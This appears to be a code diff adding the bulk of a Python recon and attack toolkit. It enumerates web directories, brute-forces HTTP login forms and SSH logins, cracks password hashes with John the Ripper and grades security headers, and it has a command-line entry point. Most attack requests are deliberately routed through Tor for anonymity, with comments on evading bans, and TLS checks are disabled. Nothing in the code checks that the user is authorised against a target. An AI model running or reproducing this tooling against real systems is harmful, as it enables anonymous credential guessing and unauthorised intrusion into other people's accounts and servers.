@@ -613,4 +613,543 @@ def dir_enum(target_url, wordlist_size="small", extensions="php,html,txt,bak,zip
         "home", "main", "welcome", "start", "begin", "init", "bootstrap"
     ]
     paths = medium_paths if wordlist_size == "medium" else small_paths
-    exts = [""] + [f".{e.strip()}" for e in extensions.split(",") i
+    exts = [""] + [f".{e.strip()}" for e in extensions.split(",") if e.strip()]
+
+    all_paths = []
+    for path in paths:
+        if "." in path.split("/")[-1]:
+            all_paths.append(path)
+        else:
+            for ext in exts:
+                all_paths.append(path + ext)
+
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+
+    print(f"[*] Dir enum via Tor: {target_url} ({len(all_paths[:300])} paths)", file=sys.stderr)
+
+    for path in all_paths[:300]:  # Reduced from 500 — Tor makes this slow
+        url = f"{target_url}/{path}"
+        try:
+            # Use Tor for dir busting
+            with tor_urlopen(url, timeout=15) as resp:  # 15s timeout per request
+                status = resp.status
+                length = resp.headers.get("Content-Length", "?")
+                content_type = resp.headers.get("Content-Type", "").split(";")[0]
+                if status in [200, 201, 204, 301, 302, 307, 308, 401, 403]:
+                    severity = "HIGH" if status == 200 else (
+                        "MEDIUM" if status in [301, 302, 307, 308] else "LOW"
+                    )
+                    if any(s in path for s in [
+                        "admin", "shell", "config", "backup", ".env",
+                        "passwd", "sql", "git", "debug", "log"
+                    ]):
+                        severity = "CRITICAL" if status == 200 else "HIGH"
+                    result["found"].append({
+                        "url": url, "status": status, "size": length,
+                        "type": content_type, "severity": severity,
+                        "note": get_dir_note(path, status)
+                    })
+            result["scanned"] += 1
+        except urllib.error.HTTPError as e:
+            if e.code in [401, 403]:
+                result["found"].append({
+                    "url": url, "status": e.code, "size": "?",
+                    "type": "", "severity": "MEDIUM",
+                    "note": "Access restricted — resource exists"
+                })
+            result["scanned"] += 1
+        except Exception:
+            result["errors"] += 1
+            result["scanned"] += 1
+
+        # Small delay between requests through Tor to avoid circuit overload
+        time.sleep(0.1)
+
+    result["total"] = len(result["found"])
+    result["found"].sort(
+        key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}.get(x.get("severity", "LOW"), 3)
+    )
+    return result
+
+
+def get_dir_note(path, status):
+    notes = {
+        ".git": "Git repository exposed — source code may be accessible",
+        ".env": "Environment file exposed — credentials may be visible",
+        "phpinfo": "PHP configuration exposed",
+        "phpmyadmin": "phpMyAdmin exposed — database admin interface",
+        "wp-admin": "WordPress admin panel",
+        "backup": "Backup file/directory found",
+        ".htpasswd": "Password file exposed",
+        "config": "Configuration file found",
+        "admin": "Admin panel found",
+        "shell": "Potential shell/command execution endpoint",
+        "passwd": "Password file found",
+        "sql": "Database file/endpoint found",
+        "debug": "Debug interface exposed",
+        "log": "Log file accessible",
+        "robots.txt": "Robots.txt — check for hidden paths",
+        ".DS_Store": "macOS metadata file — directory structure exposed",
+        "composer.json": "Dependency file exposed — reveals technology stack",
+    }
+    for k, v in notes.items():
+        if k in path.lower():
+            return v
+    if status == 401:
+        return "Authentication required"
+    if status == 403:
+        return "Forbidden — resource exists but access denied"
+    if status in [301, 302]:
+        return "Redirect found"
+    return "Resource found"
+
+
+# ─── LOGIN BRUTE FORCE (via Tor) ──────────────
+def brute_force_http(url, usernames, passwords, user_field="username", pass_field="password"):
+    """
+    HTTP brute force through Tor. Tor provides IP anonymity but slows requests.
+    Added longer sleep between attempts to avoid Tor circuit bans.
+    """
+    result = {"url": url, "attempts": 0, "found": [], "status": "running"}
+
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+
+    for username in usernames[:10]:
+        for password in passwords[:50]:
+            try:
+                data = urllib.parse.urlencode({
+                    user_field: username,
+                    pass_field: password
+                }).encode()
+
+                with tor_urlopen(url, timeout=20, data=data) as resp:
+                    body = resp.read().decode(errors="ignore")
+                    fail_kw = ["invalid", "incorrect", "wrong", "failed", "error",
+                               "denied", "bad credentials", "unauthorized"]
+                    success_kw = ["dashboard", "welcome", "logout", "profile",
+                                  "account", "success"]
+                    body_lower = body.lower()
+                    is_fail = any(k in body_lower for k in fail_kw)
+                    is_success = any(k in body_lower for k in success_kw)
+                    if is_success and not is_fail:
+                        result["found"].append({
+                            "username": username,
+                            "password": password,
+                            "status": resp.status
+                        })
+                result["attempts"] += 1
+                time.sleep(0.5)  # Slightly longer delay through Tor
+            except Exception:
+                result["attempts"] += 1
+
+    result["status"] = "complete"
+    return result
+
+
+def brute_force_ssh(host, port, usernames, passwords):
+    """
+    SSH brute force. SSH can be proxied through Tor using paramiko + SOCKS5.
+    """
+    result = {"host": host, "port": port, "attempts": 0, "found": [], "status": "running", "note": ""}
+    try:
+        import paramiko
+        for username in usernames[:5]:
+            for password in passwords[:20]:
+                try:
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+                    # Try to route SSH through Tor SOCKS5
+                    try:
+                        import socks
+                        proxy_sock = socks.socksocket()
+                        proxy_sock.set_proxy(socks.SOCKS5, TOR_SOCKS_HOST, TOR_SOCKS_PORT)
+                        proxy_sock.settimeout(30)
+                        proxy_sock.connect((host, int(port)))
+                        client.connect(
+                            host, port=int(port),
+                            username=username, password=password,
+                            timeout=30, banner_timeout=30,
+                            sock=proxy_sock
+                        )
+                    except ImportError:
+                        # Fallback: direct connection
+                        client.connect(
+                            host, port=int(port),
+                            username=username, password=password,
+                            timeout=30, banner_timeout=30
+                        )
+
+                    result["found"].append({"username": username, "password": password})
+                    client.close()
+                except paramiko.AuthenticationException:
+                    pass
+                except Exception:
+                    break
+                result["attempts"] += 1
+                time.sleep(0.5)
+        result["status"] = "complete"
+    except ImportError:
+        result["status"] = "error"
+        result["note"] = "paramiko not installed: pip3 install paramiko --break-system-packages"
+    return result
+
+
+# ─── WEB HEADERS (via Tor) ────────────────────
+def analyze_web_headers(target):
+    """
+    Fetch HTTP headers through Tor SOCKS5 proxy.
+    Increased timeout for Tor latency.
+    """
+    result = {
+        "url": "", "status_code": None, "headers": {}, "issues": [],
+        "score": 0, "grade": "F", "server": "", "technologies": []
+    }
+    for scheme in ["https", "http"]:
+        url = f"{scheme}://{target}" if not target.startswith("http") else target
+        try:
+            with tor_urlopen(url, timeout=30) as resp:
+                result["url"] = url
+                result["status_code"] = resp.status
+                headers = dict(resp.headers)
+                result["headers"] = headers
+                server = headers.get("Server", "")
+                result["server"] = server
+                if server:
+                    result["technologies"].append(server)
+                    if re.search(r'\d+\.\d+', server):
+                        result["issues"].append({
+                            "severity": "MEDIUM",
+                            "msg": f"Server version disclosed: {server}"
+                        })
+                xpb = headers.get("X-Powered-By", "")
+                if xpb:
+                    result["technologies"].append(xpb)
+                    result["issues"].append({"severity": "LOW", "msg": f"X-Powered-By disclosed: {xpb}"})
+                score = 100
+                checks = [
+                    ("Strict-Transport-Security", "HSTS not set — HTTPS downgrade risk", "HIGH"),
+                    ("Content-Security-Policy", "No CSP — XSS risk", "HIGH"),
+                    ("X-Frame-Options", "No X-Frame-Options — Clickjacking risk", "MEDIUM"),
+                    ("X-Content-Type-Options", "No X-Content-Type-Options — MIME sniffing risk", "MEDIUM"),
+                    ("Referrer-Policy", "No Referrer-Policy", "LOW"),
+                    ("Permissions-Policy", "No Permissions-Policy", "LOW"),
+                ]
+                hdr_lower = {k.lower() for k in headers}
+                for hdr, msg, sev in checks:
+                    if hdr.lower() not in hdr_lower:
+                        result["issues"].append({"severity": sev, "msg": msg})
+                        score -= {"HIGH": 20, "MEDIUM": 10, "LOW": 5}[sev]
+                result["score"] = max(0, score)
+                if score >= 90:   result["grade"] = "A+"
+                elif score >= 75: result["grade"] = "A"
+                elif score >= 60: result["grade"] = "B"
+                elif score >= 45: result["grade"] = "C"
+                elif score >= 30: result["grade"] = "D"
+                else:             result["grade"] = "F"
+                break
+        except Exception as e:
+            result["issues"].append({"severity": "INFO", "msg": f"Could not fetch {url}: {str(e)}"})
+    return result
+
+
+# ─── MITIGATIONS & RISK ───────────────────────
+def get_mitigation_advice(service, product, cves):
+    advice = []
+    sl = (service or "").lower()
+    pl = (product or "").lower()
+    svc_advice = {
+        "ssh": ["Disable root login (PermitRootLogin no)", "Use SSH key authentication",
+                "Change default port 22", "Deploy fail2ban", "Restrict to specific IPs"],
+        "http": ["Enable HTTPS, redirect all HTTP", "Implement CSP headers",
+                 "Add X-Frame-Options", "Keep web server updated", "Disable directory listing"],
+        "https": ["Ensure TLS 1.2+ only", "Use ECDHE/AES-GCM ciphers", "Enable HSTS", "Renew certs before expiry"],
+        "ftp": ["Replace FTP with SFTP/FTPS", "Disable anonymous access", "Use chroot jail"],
+        "smtp": ["Enable SMTP auth", "Implement SPF, DKIM, DMARC", "Use TLS"],
+        "mysql": ["Never expose to internet", "Bind to localhost only", "Least privilege", "Enable audit logging"],
+        "postgresql": ["Restrict via pg_hba.conf", "Use SSL for remote connections", "Enable query logging"],
+        "rdp": ["Enable NLA", "Use VPN", "Account lockout policy", "Change default port 3389", "Require MFA"],
+        "smb": ["Disable SMBv1 immediately", "Enable SMB signing", "Block ports 445/139"],
+        "telnet": ["DISABLE TELNET — plaintext protocol", "Replace with SSH", "Block port 23"],
+        "vnc": ["Never expose VNC publicly", "Use VPN or SSH tunnel", "Enable VNC password auth"],
+        "redis": ["Bind to localhost only", "Enable AUTH password", "Never expose publicly"],
+        "mongodb": ["Enable authentication", "Bind to localhost", "Use TLS", "Enable audit logging"],
+    }
+    for svc, tips in svc_advice.items():
+        if svc in sl or svc in pl:
+            advice.extend(tips)
+            break
+    if not advice:
+        advice = [
+            f"Keep {product or service} updated to latest version",
+            "Apply principle of least privilege",
+            "Monitor service logs for suspicious activity",
+            "Restrict access to authorized hosts only"
+        ]
+    critical = [c for c in cves if c.get("severity") in ["CRITICAL", "HIGH"]]
+    if critical:
+        advice.insert(0, f"URGENT: {len(critical)} critical/high CVEs — patch immediately")
+    advice.extend(["Implement IDS/IPS monitoring", "Schedule regular vulnerability scans"])
+    return advice[:8]
+
+
+def calculate_risk(cves, port, service):
+    high_risk = {21, 22, 23, 25, 80, 443, 445, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 27017}
+    base = 0
+    if cves:
+        base = max((c.get("score") or 0) for c in cves)
+        if any(c.get("has_exploit") for c in cves):
+            base = min(10, base + 1)
+    elif port in high_risk:
+        base = 5.0
+    else:
+        base = 2.0
+    if service and service.lower() == "telnet":
+        base = 9.5
+    if base >= 9.0:   level = "CRITICAL"
+    elif base >= 7.0: level = "HIGH"
+    elif base >= 4.0: level = "MEDIUM"
+    elif base > 0:    level = "LOW"
+    else:             level = "UNKNOWN"
+    return round(base, 1), level
+
+
+# ─── FULL SCAN ORCHESTRATOR ───────────────────
+def full_scan(target, modules=None):
+    """
+    Orchestrates all scan modules.
+    CVE lookups are rate-limited more conservatively since Tor exit nodes
+    share IP addresses and may hit NVD rate limits faster.
+    """
+    if modules is None:
+        modules = ["ports", "ssl", "dns", "headers"]
+
+    result = {"target": target, "scan_time": datetime.utcnow().isoformat(), "modules": {}}
+
+    scan = run_nmap_scan(target)
+    if "error" in scan:
+        result["modules"]["ports"] = scan
+        result["summary"] = {
+            "total_cves": 0, "critical_cves": 0,
+            "high_cves": 0, "exploitable": 0, "open_ports": 0
+        }
+        result["error"] = scan["error"]
+        return result
+
+    # CVE lookups — throttled more aggressively for Tor (shared exit node IPs)
+    for host in scan.get("hosts", []):
+        for port in host.get("ports", []):
+            svc = port.get("service", "")
+            prod = port.get("product", "")
+            ver = port.get("version", "")
+            cves = []
+            if prod:
+                cves = search_nvd_cves(prod, ver)
+                # Tor exit nodes share IPs — be generous with rate limit waits
+                time.sleep(2 if NVD_API_KEY else 8)
+            if not cves and svc:
+                cves = search_nvd_cves(svc, ver)
+                time.sleep(2 if NVD_API_KEY else 8)
+            port["cves"] = cves
+            port["mitigations"] = get_mitigation_advice(svc, prod, cves)
+            port["risk_score"], port["risk_level"] = calculate_risk(cves, port["port"], svc)
+
+    result["modules"]["ports"] = scan
+    clean = re.sub(r'https?://', '', target).split('/')[0]
+
+    if "ssl" in modules:
+        ssl_ports = [443, 8443, 465, 993, 995]
+        if "hosts" in scan:
+            open_ports = [p["port"] for h in scan.get("hosts", []) for p in h.get("ports", [])]
+            matched = [p for p in ssl_ports if p in open_ports]
+            ssl_ports = matched if matched else [443]
+        ssl_results = []
+        for sp in ssl_ports[:2]:
+            sr = analyze_ssl(clean, sp)
+            if sr.get("grade") != "N/A":
+                ssl_results.append(sr)
+        result["modules"]["ssl"] = ssl_results if ssl_results else [analyze_ssl(clean, 443)]
+
+    if "dns" in modules:
+        result["modules"]["dns"] = dns_recon(clean)
+
+    if "headers" in modules:
+        result["modules"]["headers"] = analyze_web_headers(clean)
+
+    all_cves = [
+        c for h in scan.get("hosts", [])
+        for p in h.get("ports", [])
+        for c in p.get("cves", [])
+    ]
+    result["summary"] = {
+        "total_cves": len(all_cves),
+        "critical_cves": sum(1 for c in all_cves if c.get("severity") == "CRITICAL"),
+        "high_cves": sum(1 for c in all_cves if c.get("severity") == "HIGH"),
+        "exploitable": sum(1 for c in all_cves if c.get("has_exploit")),
+        "open_ports": sum(len(h.get("ports", [])) for h in scan.get("hosts", []))
+    }
+    return result
+
+
+# ─── JOHN THE RIPPER ──────────────────────────
+def john_the_ripper(hash_input, hash_format="", wordlist="", mode="wordlist", extra_options=""):
+    import shutil, tempfile, os as _os
+    result = {
+        "mode": mode, "hash_format": hash_format or "auto-detect",
+        "cracked": [], "total_hashes": 0, "status": "running", "output": "", "note": ""
+    }
+    binary = shutil.which("john") or shutil.which("john-the-ripper")
+    if not binary:
+        result["status"] = "error"
+        result["note"] = "John the Ripper not installed. Run: sudo apt-get install john"
+        return result
+
+    hash_file = hash_input.strip()
+    tmp_file = None
+    if not _os.path.isfile(hash_file):
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
+            tf.write(hash_input.strip() + "\n")
+            tmp_file = tf.name
+        hash_file = tmp_file
+
+    with open(hash_file) as f:
+        result["total_hashes"] = sum(1 for line in f if line.strip())
+
+    cmd = [binary]
+    if hash_format:
+        cmd += [f"--format={hash_format}"]
+    if mode == "wordlist":
+        wl = wordlist if wordlist and _os.path.isfile(wordlist) else "/usr/share/wordlists/rockyou.txt"
+        if not _os.path.isfile(wl):
+            for fallback in ["/usr/share/john/password.lst", "/usr/share/dict/words"]:
+                if _os.path.isfile(fallback):
+                    wl = fallback
+                    break
+            else:
+                result["status"] = "error"
+                result["note"] = "Wordlist not found. Install: sudo apt-get install wordlists"
+                if tmp_file: _os.unlink(tmp_file)
+                return result
+        cmd += [f"--wordlist={wl}"]
+    elif mode == "rules":
+        wl = wordlist if wordlist and _os.path.isfile(wordlist) else "/usr/share/wordlists/rockyou.txt"
+        cmd += [f"--wordlist={wl}", "--rules"]
+    elif mode == "incremental":
+        cmd += ["--incremental"]
+    elif mode == "single":
+        cmd += ["--single"]
+    elif mode == "show":
+        cmd += ["--show"]
+
+    SAFE_EXTRA = re.compile(
+        r'^--(min-length=\d+|max-length=\d+|fork=\d+|node=\d+/\d+|session=\w+|restore=\w*|pot=[\w/.-]+)$'
+    )
+    for opt in extra_options.split():
+        if SAFE_EXTRA.match(opt):
+            cmd.append(opt)
+    cmd.append(hash_file)
+
+    try:
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+        raw_out = proc.stdout + "\n" + proc.stderr
+        result["output"] = raw_out[:3000]
+        show_cmd = [binary, "--show", hash_file]
+        if hash_format:
+            show_cmd.insert(1, f"--format={hash_format}")
+        show_proc = subprocess.run(show_cmd, capture_output=True, text=True, timeout=30)
+        for line in show_proc.stdout.splitlines():
+            if ":" in line and not line.startswith("#"):
+                parts = line.split(":")
+                if len(parts) >= 2 and parts[1]:
+                    result["cracked"].append({
+                        "hash": parts[0], "password": parts[1],
+                        "extra": ":".join(parts[2:]) if len(parts) > 2 else ""
+                    })
+        m = re.search(r'(\d+)\s+password\s+hash(?:es)?\s+cracked', raw_out, re.IGNORECASE)
+        cracked_count = int(m.group(1)) if m else len(result["cracked"])
+        result["status"] = "complete"
+        result["cracked_count"] = cracked_count
+        result["note"] = (
+            f"{cracked_count} of {result['total_hashes']} hash(es) cracked."
+            if cracked_count else
+            "No hashes cracked. Try a different mode, wordlist, or format."
+        )
+    except subprocess.TimeoutExpired:
+        result["status"] = "timeout"
+        result["note"] = "John the Ripper timed out after 5 minutes."
+    except Exception as e:
+        result["status"] = "error"
+        result["note"] = str(e)
+    finally:
+        if tmp_file and _os.path.exists(tmp_file):
+            _os.unlink(tmp_file)
+
+    return result
+
+
+# ─── ENTRY POINT ──────────────────────────────
+if __name__ == "__main__":
+    import os
+
+    if len(sys.argv) < 2:
+        print(json.dumps({"error": "No target specified"}))
+        sys.exit(1)
+
+    if "--discover" in sys.argv:
+        idx = sys.argv.index("--discover")
+        print(json.dumps(network_discovery(sys.argv[idx + 1])))
+        sys.exit(0)
+
+    if "--subdomains" in sys.argv:
+        idx = sys.argv.index("--subdomains")
+        size = sys.argv[idx + 2] if len(sys.argv) > idx + 2 else "medium"
+        print(json.dumps(subdomain_finder(sys.argv[idx + 1], size)))
+        sys.exit(0)
+
+    if "--dirbust" in sys.argv:
+        idx = sys.argv.index("--dirbust")
+        size = sys.argv[idx + 2] if len(sys.argv) > idx + 2 else "small"
+        exts = sys.argv[idx + 3] if len(sys.argv) > idx + 3 else "php,html,txt"
+        print(json.dumps(dir_enum(sys.argv[idx + 1], size, exts)))
+        sys.exit(0)
+
+    if "--brute-http" in sys.argv:
+        idx = sys.argv.index("--brute-http")
+        url = sys.argv[idx + 1]
+        users = sys.argv[idx + 2].split(",")
+        pwds = sys.argv[idx + 3].split(",")
+        uf = sys.argv[idx + 4] if len(sys.argv) > idx + 4 else "username"
+        pf = sys.argv[idx + 5] if len(sys.argv) > idx + 5 else "password"
+        print(json.dumps(brute_force_http(url, users, pwds, uf, pf)))
+        sys.exit(0)
+
+    if "--brute-ssh" in sys.argv:
+        idx = sys.argv.index("--brute-ssh")
+        host = sys.argv[idx + 1]
+        port = sys.argv[idx + 2]
+        users = sys.argv[idx + 3].split(",")
+        pwds = sys.argv[idx + 4].split(",")
+        print(json.dumps(brute_force_ssh(host, port, users, pwds)))
+        sys.exit(0)
+
+    if "--john" in sys.argv:
+        idx = sys.argv.index("--john")
+        hash_input  = sys.argv[idx + 1] if len(sys.argv) > idx + 1 else ""
+        hash_format = sys.argv[idx + 2] if len(sys.argv) > idx + 2 else ""
+        wordlist    = sys.argv[idx + 3] if len(sys.argv) > idx + 3 else ""
+        mode        = sys.argv[idx + 4] if len(sys.argv) > idx + 4 else "wordlist"
+        extra       = sys.argv[idx + 5] if len(sys.argv) > idx + 5 else ""
+        print(json.dumps(john_the_ripper(hash_input, hash_format, wordlist, mode, extra)))
+        sys.exit(0)
+
+    mods = ["ports", "ssl", "dns", "headers"]
+    target = sys.argv[-1]
+    if "--modules" in sys.argv:
+        idx = sys.argv.index("--modules")
+        mods = sys.argv[idx + 1].split(",")
+
+    print(json.dumps(full_scan(target, mods)))
